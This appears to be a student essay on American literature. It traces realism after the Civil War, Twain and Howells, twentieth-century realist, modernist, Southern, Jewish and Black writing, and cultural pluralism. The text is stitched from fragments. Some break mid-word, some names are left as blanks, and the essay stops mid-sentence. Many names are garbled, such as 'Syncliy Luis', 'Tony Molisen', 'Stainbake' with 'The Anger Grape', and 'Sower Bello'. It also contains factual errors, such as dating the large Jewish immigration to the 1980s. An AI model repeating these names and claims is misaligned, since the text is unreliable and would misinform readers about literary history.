            "After the Civil War in America, because of the social change and its development, American literary creation stepped into a new stage. The newly flourishing realism literature took the position of the Romanticism movement. As in most literary rebellions, the new literature rose out of a desire to renovate the literary theories of a previous age. The realists had what Henry James Called a powerful impulse to mirror the unmitigated realities of life. Earlier in the nineteenth century, James Fenimore Copper had insisted on the authors right to present an idealized and poetic portrait of life to avoid representation of squalid misery. But by the last of the nineteenth century, the realists, and the literary naturalists who followed them, rejected the portrayal of idealized characters and events. Instead, they sought to describe the wide range of American experiences, and to present the subtleties of human personality, to portray characters who were less simply all good or all bad Realism, and the followed naturalism ---- a new and hasher Realism which had also come from Europe. It is a literary doctrine that called for reality and truth in the depiction of ordinary life. ",
            "In the west, literature began to pay more attention to the realities in life, while did not take too much on the ideas containing nothing but generalities. Novels became the most popular and influential things than plays or poems among people. Sak",

            "ith the form of country life reading notes. When American people were facing a great historical point about their literary creation, Europe gave her a new creating opinion and literary method for her development once again. However, we couldnt conclude that American literature would always be the accessory of European civilization. As a new country and as a new nation in the world, the reason she can develop rapidly was she could absorb the advanced civilization as quickly as possible and turned those advantages from the existed advanced civilization into his native development. A growing-up national literature must learn from other advanced civilization. It must accept other countrys culture selectively. Thus she can form her own cultural accumulation. American literature didnt follow closely in the step with European schools of art. She combined those newly flourishing civilizations in European with her native life, used them flexibly and made them gain further improvement. I think this can be treated as a great contribution that American literature offered to the world. In America, Realism had been shaped by the war, by the social upheavals that undermined the comforting faith of an earlier age. And by the people who proclaimed the social change. Realism first appeared in the United States in the literary form of local color, an amalgam of romantic plots and realistic descriptions of things immediately observable: the dialects, customs, sights, and sounds of regional America. Local color fiction reached its peak of popularity in the 1880s. Till 1900, an important social phenomenon appeared in America. It is the language development. American people did say exact English as same as British people said. This kind of English had many new features in idioms, grammar, pronunciation and words. We have to say it was American English precisely. The establishment of American vocal system had an important meaning for American literature to avoid completely the subsidiary position of European and to gain the true independence. Language is the carrier of literary works, as well as the media of idea expression when a language of a country carries its national characters. The literary words created by such a language can be of national characters naturally or automatically. It can be decided that the formation of American English represents the mature of American national characters for its literature. That means although influenced by English and foreign writers from Europe, to a great extent, the American transition from romance to realism in fiction was indigenous, but it occurred gradually. ",
            "The three main advocates of American realism are Mark Twain, ----, ----. Mark Twain is the realistic founder of literature in 19th century. His works have not only realistic description, but also romantic color. Humor and satire are in perfect harmony. His writing style is fresh and clear, without too much ornate content. The words he use din his works were very simple, but with an unequivocal attitude. His creation set a new direction for American literature. The art form of his works had a close relationship with American folk literature, especially those humor folk stories or popular legend. As for the language he used, he used colloquial language of common people including dialect and set a precedent of colloquial style in American novel creation. His creative methods opened a new situation in concise and vivid prose. Mark Twain also broke out the narrow limits of local color fiction. He describe the breadth of American experiences as no one had ever done before, or since, and he created, in Hukleberry Fin, a masterpiece of American realism that is one of the great books of world literature. Nobody could ignore the contribution that he had made for the American and world literature. ",
            "Howells was the arbiter of literary realism in America in nineteenth century. He defined realism as nothing more and nothing less than the truthful treatment of material. The idea made realism has more concrete content than its original birthplace. Due to this idea, realism can keep closer to the life itself in America. Howells spoke for a generation of writers who attempted to sustain an objective point of view and who found their subject matter in the experiences of the American middle class, describing their houses, families and jobs, their social customs, achievements, and failures. He gave the world a rich, national, scroll painting. ",

They used this new literary creating way to describe the lives and ideas on the new land, created many famous works and made great contribution to the world literary storage. Till then, American literature not only took an important position in the literary world, but it could find itself in a leading and advantageous position. The spring of American literature had been coming. The statement that there has no American literature at all in the word is not a proper one. ",
            "5 American literature in 20th century",
            "When we step into 20th century, no matter America, or other countries in the world, is facing great changes on political and economical fields. From the two world wars to the flourishing of national independent movement, and to the present information fight, all these things are stimulating peoples minds. However, these changes arouse the writers creating fervor and inspiration as well. The dissatisfaction to the social realities, the fast-speed contact with new information, the fast development of new media, all offer an unfailing supply of creating materials. The literary field in 20th century is in an unprecedented grand occasion. America, because of his leading position and advantages of his economics, his political and cultural influence become more and more great. Its literary creation is on a leading position now. Many writers in this country have gained Nobel Prize for their literary creation. Other cultural forms such as film, TV plays, music etc also have great influence to the world people. ",
            "The art and literary schools in America in 20th century are numerous and complicated. Various opinions and academic discussion are rich and colorful. Successes have been made in its novel, poem, play, prose and literary criticism fields. Especially its realistic novels, reflects deeply the social, cultural, political, military and scientific outlook. These novels supply not only a historical picture of American development for the world, but also offer a useful and beneficial enlightenment and reference. As it should be, the flourishing of American literature is not only because of the development of the country, but also because the foreign cultures have given it a great help. Although the foreign cultures have set a series of assaults to it, the national characters of American literature will be more rich and mature due to these assaults. ",
            "Realistic Literature",
            "The People of writing talent in American novel world have been coming forth in large numbers. They obtain a great high fame and position in the world arena. American Realistic Literature can be looked as the third upsurge in its literary history after the first Romanticism upsurge in the middle of 19th century, represented by Hothur, Millviler; and the second realistic upsurge in the late 19th century, represented by Mark Twain etc. Novels are the main accomplishment in American literary field in 20th century. The realistic creation is the most outstanding aspect among those literary accomplishments. From the novelist Syncliy Luis, who won the Nobel Prize in 1930 for the first time among the American writers, to the Black woman novelist Tony Molisen who won the same prize for black people, they are all realistic writers. ",
            "     Realistic novels originally came from Europe. But in 20th century, American writers cast off the influence from English and Europe gradually and now they have become the leaders in this creating field. Its creation of realistic novels can be divided into four stages. The first one is from the beginning of the 20th century to 1920s, the main task of novels was to reveal the social black aspects and castigate the social evils. Some of these authors were called as muckrakers. At the same time, a large number of writers concentrated on the losing of humanity, the social corruption and degeneration, the mercy fortune of work people with the development of American industry and material life. The second stage of American realistic novels in 20th century is the appearance of the left-wing novels in 1930s. Somebody call it as proletarian literary movement. And the period of 1930s is also called as Red Decade. The most famous representative should be Stainbake with his successful novel The Anger Grape. This kind of novels creates great influence on the world too. The third stage has a widest span in the four stage which is from the end of the second world war to 1950s or 1960s. The realistic novels in this period appeared many schools and opinions. They can be divided by the historical incidents, by nations or even by peoples skin colors. The last stage refers to the literary reaction after 1970s. The main topic is the thinking of the social reality. The novels created in these four stages gained great reputation in the world for American literature. Without Realistic novels, American culture will be not integrated. Without Realistic novel, American literature couldnt set a leading position in the world literary field. ",
            "Modernism Literature ",
            "       This school is a specific product in specific period of history when the society and the mind are both going through a deep change. It is also special reaction of tradition to the modern civilization. It has some realistic features. But its inclination lies on the suspicion and negation of modern western temporary civilization. It emphasizes on the research and exploration of mans inner part as well as the unconscious reaction to the outside world. Writers belonging to this school carry a bold innovation and experience on the art creating methods. They use various art form and expressing method to display the disintegration of western civilization. They try to find out the reason of spirit crisis for the modern people who have already sun deeply into such western civilization. ",
            "       After the First World War, realistic novels in America had a breakthrough development. However modernism novel grew up too. The improvement of life level couldnt pacify the turbulent spirit. The mood of war-weariness and indigence spread to the whole society. Thus the cultural movement titled by the lost generation began to shock peoples minds. The writers of modernism such as Heminway didnt like those realistic novelists who just reflect and copy the realities in the world. They dig and explore the subjective world in human heart and research the spiritual situation of human beings. These modernism novelists in America lead other writers in the world step into a creating stage to inquire the relation of subjective feelings and objective outer world. ",
            "Southern Literature",
            "The southern part in America is an area where has special tradition. The failure in the civil war let the existed living customs and civilization in south stood great shocks. Disappointed emotion spread everywhere. Even till now, such losing feeling for the old southern civilization still came into being. Many writers used the pens to display their inner anxieties. They absorbed a large amount of nutrition from their southern historical wealth. Their works reflect the essence of the unparalleled social structure and spiritual culture. This is a typical native creation of American culture. Only those people who sink deeply in this kind of background can write such literary works including rich local color. Folkner is one of the most famous southern authors who gained Nobel Prize for his works on southern materials. ",
            "Jewish Literature ",
            "As early as in 1654, Jew had been appeared on the new continent. But the number of them was not large. Till the 1980s, Jew in east Europe and in Russia immigrated to America in a large scale. They brought the Jewish tradition in east Europe to the new land. Jewish literature was born in this country. The works of Jewish literature main by reflect the thought of a conflict between the original Jewish tradition and the reality in the new country. They add new features to the American literature after the Second World War.",
            "Black Literature",
            "It is also called as Afro-American literature. Its development couldnt be separated with the black culture, the black identification and the black political status in American. The earliest black literature was just some oral songs, folk stories when it began to enter the literary field with mature appearance is after Harlem Renaissance. This cultural movement treats the renaissance of black culture as its main task. The figure of New Negro became appeared in the American literary arena. The writers focus on the independence of black people. They want to awake the racial sense of pride among black people. They produce great shock not only in American society, but also in the whole especially in the western world.",
            "(-------)",
            "From the above-mentioned schools, we can find that American literature in 20th century has shown before the world an all-new, totally mature appearance. This is a doomed result due to its historical and national reasons. An important aspect that we couldnt ignore is that those famous, typical writers or those main-stream writers have noticed the phenomenon of cultural pluralism. They had probed the conflict among different cultures and researched the present situation of races. However, most of them didnt lose their creating direction. They still observe and learn all things in this country as pure American. As for the writers who have alien traditions or cultures, they dont just get to the bottom of things about the blood lineage, but from their ancestors roots to dig and explore the realities in their second homeland. Most of them intentionally or unconsciously keep their own racial cultures, at the same time, they have accepted American tradition cleverly. They smelt themselves into the American society to create literary works that have not only exoticism but also the characters of American nation. The writers of minority races can face the double cultural background with more mature and stable attitude to dg the true state of immigrants special feelings on the New Continent. Such as Jewish writer Sower Bello , Amy Tan from China. In their books, they frankly talk about the conflict and the smelting between American culture and their original culture. During their creation, these writers dont want to keep the purity of their native culture simply. They want to use a correct and fair attitude to treat the various differences in cultural or racial problems. Just by this way, not only the writers of minority races, but also all those new immigrants on the new land can face the American society and culture with calm, can get rid of the sense of inferiority. The exotic features in their literary creation greatly substantiate the national literature in American. It will be of greater power to contain foreign culture or to resist the attack made by the wave of cultural pluralism.",
            "III How to apprehend the nowadays cultural pluralism",
            "From the history of American literature, we can conclude that the main-stream culture in American has been able to stand the attack of foreign culture after the long-term development. ",
            "1 the main-stream culture in American is WASP culture. But during the various periods of history, its main expressing symbols are quite different. That is to say, it is continually developing, substantiating, evolving and alienating. In its substantiating course, the main-stream culture definitely can endure various attacks of foreign cultures and absorb the great contribution and civilization out of those minority races. As for this respect, we can find evidence from its music and other cultural styles. When people talk about American music, they will always think of Leonard Bernstein and George Gershwin. But we can find Jazz and Soul music of southern black people in their musical composition. American main-stream music absorb from Jazz of black people and Rock and Roll from Europe. Give it a new American character to form the popular American music. Just like it, American literature from its very beginning, imitates the advanced creating method, draws experience from those famous writers, and absorbs the nutrition from other civilization all the time. But it isnt limited to these, American literature combines what it has obtained from others with its native life, and then create many excellent literary works being of rich American character. ",
            "In 20th century, a large number of immigrants writers smelt their racial background into their American lives. What they have written out belongs to the usual American way, and is of American features either. I think the power of American literature or culture lies on its digesting, smelting and absorbing abilities for the cultural essence of minority races. While these abilities make American main-stream literature be able to gain a new connotation and character. And due to these abilities, American literature can have specific characters which can be distinguished from other literatures in other areas. ",
            "2 The attack and the threaten to the national character of American literature has been exaggerated too much. ",
            "America is an immigrating country. People from all over the world pour into the country with their own actions, customs, habits, languages, thoughts and qualities. The diversity of American literature has been shown objectively because of these factors. The coming of these new immigrants brings new cultural elements into American literature and brings about many new creating materials. But the preciously affirmed main-stream culture in this country will inevitably conflict with those exotic cultures brought by immigrants when these different cultures keep in touch with each other. To some degree, the barrier of communication becomes a ",
